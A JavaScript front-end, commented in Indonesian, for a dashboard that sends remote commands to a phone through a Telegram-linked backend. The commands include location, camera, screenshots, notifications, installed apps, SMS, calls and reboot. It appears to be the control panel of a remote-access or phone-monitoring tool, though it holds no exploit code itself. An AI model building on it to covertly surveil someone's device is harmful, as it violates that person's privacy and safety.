// Konfigurasi aplikasi
const CONFIG = {
    TELEGRAM_BOT_TOKEN: '',
    TELEGRAM_CHAT_ID: '',
    API_BASE_URL: window.location.origin
};

// Inisialisasi aplikasi
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
});

// Inisialisasi aplikasi
function initializeApp() {
    addLog('Aplikasi dimulai. Menunggu koneksi perangkat...');
    
    // Cek apakah token dan chat ID sudah diset
    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
        addLog('ERROR: Token bot atau Chat ID Telegram belum dikonfigurasi!', 'error');
    }
}

// Setup event listeners untuk semua tombol
function setupEventListeners() {
    // Tombol informasi perangkat
    document.getElementById('btn-battery').addEventListener('click', () => sendCommand('battery'));
    document.getElementById('btn-location').addEventListener('click', () => sendCommand('location'));
    document.getElementById('btn-device-info').addEventListener('click', () => sendCommand('device_info'));
    
    // Tombol kamera & media
    document.getElementById('btn-screenshot').addEventListener('click', () => sendCommand('screenshot'));
    document.getElementById('btn-camera').addEventListener('click', () => sendCommand('camera'));
    document.getElementById('btn-flash-toggle').addEventListener('click', () => sendCommand('flash_toggle'));
    
    // Tombol sistem
    document.getElementById('btn-apps').addEventListener('click', () => sendCommand('apps'));
    document.getElementById('btn-notifications').addEventListener('click', () => sendCommand('notifications'));
    document.getElementById('btn-reboot').addEventListener('click', () => {
        if (confirm('Apakah Anda yakin ingin merestart perangkat?')) {
            sendCommand('reboot');
        }
    });
    
    // Tombol pesan & panggilan
    document.getElementById('btn-send-sms').addEventListener('click', showSmsModal);
    document.getElementById('btn-call').addEventListener('click', showCallModal);
    
    // Tombol utilitas
    document.getElementById('btn-clear-logs').addEventListener('click', clearLogs);
    
    // Modal handlers
    setupModalHandlers();
}

// Setup handlers untuk modal
function setupModalHandlers() {
    // SMS Modal
    const smsModal = document.getElementById('sms-modal');
    const smsForm = document.getElementById('sms-form');
    const smsClose = smsModal.querySelector('.close');
    
    smsClose.addEventListener('click', () => smsModal.style.display = 'none');
    smsForm.addEventListener('submit', handleSmsSubmit);
    
    // Call Modal
    const callModal = document.getElementById('call-modal');
    const callForm = document.getElementById('call-form');
    const callClose = callModal.querySelector('.close');
    
    callClose.addEventListener('click', () => callModal.style.display = 'none');
    callForm.addEventListener('submit', handleCallSubmit);
    
    // Close modal ketika klik di luar
    window.addEventListener('click', (e) => {
        if (e.target === smsModal) smsModal.style.display = 'none';
        if (e.target === callModal) callModal.style.display = 'none';
    });
}

// Tampilkan modal SMS
function showSmsModal() {
    document.getElementById('sms-modal').style.display = 'block';
}

// Tampilkan modal panggilan
function showCallModal() {
    document.getElementById('call-modal').style.display = 'block';
}

// Handle submit form SMS
function handleSmsSubmit(e) {
    e.preventDefault();
    const phoneNumber = document.getElementById('phone-number').value;
    const message = document.getElementById('sms-message').value;
    
    if (phoneNumber && message) {
        sendCommand('send_sms', { number: phoneNumber, message: message });
        document.getElementById('sms-modal').style.display = 'none';
        document.getElementById('sms-form').reset();
    }
}

// Handle submit form panggilan
function handleCallSubmit(e) {
    e.preventDefault();
    const phoneNumber = document.getElementById('call-number').value;
    
    if (phoneNumber) {
        sendCommand('call', { number: phoneNumber });
        document.getElementById('call-modal').style.display = 'none';
        document.getElementById('call-form').reset();
    }
}

// Kirim perintah ke backend
async function sendCommand(command, data = {}) {
    addLog(`Mengirim perintah: ${command}`);
    
    try {
        const response = await fetch(`${CONFIG.API_BASE_URL}/api/command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                command: command,
                data: data,
                telegram_chat_id: CONFIG.TELEGRAM_CHAT_ID
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            addLog(`Perintah ${command} berhasil dikirim`, 'success');
            updateConnectionStatus('connected');
        } else {
            addLog(`Gagal mengirim perintah ${command}: ${result.error}`, 'error');
            updateConnectionStatus('disconnected');
        }
    } catch (error) {
        addLog(`Error mengirim perintah: ${error.message}`, 'error');
        updateConnectionStatus('disconnected');
    }
}

// Update status koneksi
function updateConnectionStatus(status) {
    const statusElement = document.getElementById('connection-status');
    statusElement.textContent = status === 'connected' ? 'Terhubung' : 'Terputus';
    statusElement.className = `status-value ${status === 'connected' ? 'connected' : 'disconnected'}`;
}

// Tambah log ke panel log
function addLog(message, type = 'info') {
    const logContainer = document.getElementById('log-container');
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    
    const timestamp = new Date().toLocaleTimeString();
    const typeIcon = type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️';
    
    logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${typeIcon} ${message}`;
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
}

// Bersihkan log
function clearLogs() {
    document.getElementById('log-container').innerHTML = '';
    addLog('Log telah dibersihkan');
}

// Fungsi untuk mengatur token dan chat ID (bisa dipanggil dari luar)
function setTelegramConfig(token, chatId) {
    CONFIG.TELEGRAM_BOT_TOKEN = token;
    CONFIG.TELEGRAM_CHAT_ID = chatId;
    document.getElementById('telegram-id').textContent = chatId;
    addLog('Konfigurasi Telegram telah diperbarui');
}

// Simulasi update status perangkat (dalam implementasi nyata, ini akan datang dari backend)
function updateDeviceStatus(status) {
    const statusElement = document.getElementById('device-status');
    statusElement.textContent = status;
    statusElement.className = 'status-value connected';
}
